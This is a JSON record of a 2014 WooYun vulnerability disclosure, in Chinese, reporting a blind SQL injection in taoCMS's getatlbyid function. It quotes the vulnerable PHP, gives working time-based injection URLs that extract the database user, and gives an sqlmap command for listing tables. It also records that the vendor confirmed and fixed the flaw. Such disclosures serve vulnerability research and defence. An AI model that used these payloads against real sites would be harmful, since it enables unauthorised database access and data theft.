{"id": 3084, "wybug_id": "wooyun-2014-061361", "wybug_title": "taocms 一处sql盲注", "wybug_corp": "taocms开源", "wybug_author": "疯狂的dabing", "wybug_date": "2014-05-23 11:13", "wybug_open_date": "2014-07-07 11:13", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-07：\t细节向公众公开  简要描述： 比较尴尬的是，猜测由于官网使用了memcache，因此盲注失败了。。。 详细说明：  @′ 雨。 WooYun: Taocms的Sql注射一枚可以无视GPC 上面的漏洞成因是：$path变量来自于$_SERVER['QUERY_STRING']，因此变量不受GPC保护（虽然高版本PHP已经去掉了GPC）。于是作者的修复方法是：$path = Base::safeword($path);用addslashes为单引号转义。所以找个数字型的继续注入就OK。taoCMS的架构设计比较奇特，可以调用Index类中public方法。访问http://url/index.php/?path&action=getatlbyid就调用了Index::getatlbyid(‘?path&action=getatlbid’);\nstatic public function getatlbyid($id){\t\tif(!$id)return null;\t\tself::$_db=new Dbclass(SYS_ROOT.DB_NAME);\t\tif(MEMCACHE){\t\t\tself::$_mem=new Memcached(MEMCACHE);\t\t\tif(!$atl=self::$_mem->get($id.'_cms')){\t\t\t\t$atl=self::$_db->get_one(TB.\"cms\",'status=1 and id='.$id,\"*\",1);;\t\t\t\tself::$_mem->set($id.'_cms',$atl);\t\t\t}\t\t}else{\t\t\t$atl=self::$_db->get_one(TB.\"cms\",'status=1 and id='.$id,\"*\",1);\t\t}\t\treturn $atl;\t}\n可以看到$id没有进行任何处理就带入了sql查询，因此导致了注入。这里引入了一个?导致没办法进行办法闭合掉，不过好在是用了$_SERVER['QUERY_STRING']来获取查询参数，所以可以把?放到后边规避掉。访问方式就是http://url/index.php/payload%23?action=getatlbyid蛋疼的是这个函数没有输出结果。。。报错也没有回显，因此只能用盲注了。http://demo/tao/index.php/if(ascii(substr(user(),1,1))>113,sleep(4),26)%23?action=getatlbyid延迟http://demo/tao/index.php/if(ascii(substr(user(),1,1))>114,sleep(4),26)%23?action=getatlbyid正常第一个字母是char(114)=r。手工盲注太费事，写个中转脚本用sqlmap跑下。\n\n./sqlmap.py -u http://demo/tao.php?sqli=26 --technique T --dbms MySQL --prefix \"\" --suffix \"\" -D taocms --tables\n\n   漏洞证明：  \nstatic public function getatlbyid($id){\t\tif(!$id)return null;\t\tself::$_db=new Dbclass(SYS_ROOT.DB_NAME);\t\tif(MEMCACHE){\t\t\tself::$_mem=new Memcached(MEMCACHE);\t\t\tif(!$atl=self::$_mem->get($id.'_cms')){\t\t\t\t$atl=self::$_db->get_one(TB.\"cms\",'status=1 and id='.$id,\"*\",1);;\t\t\t\tself::$_mem->set($id.'_cms',$atl);\t\t\t}\t\t}else{\t\t\t$atl=self::$_db->get_one(TB.\"cms\",'status=1 and id='.$id,\"*\",1);\t\t}\t\treturn $atl;\t}\n$id未处理带入sql查询，导致注入。   修复方案：  sqli防注入   版权声明：转载请注明来源 疯狂的dabing@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-25 00:17 厂商回复： 感谢dabing，已经修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-07 11:48 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  带我飞可好？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}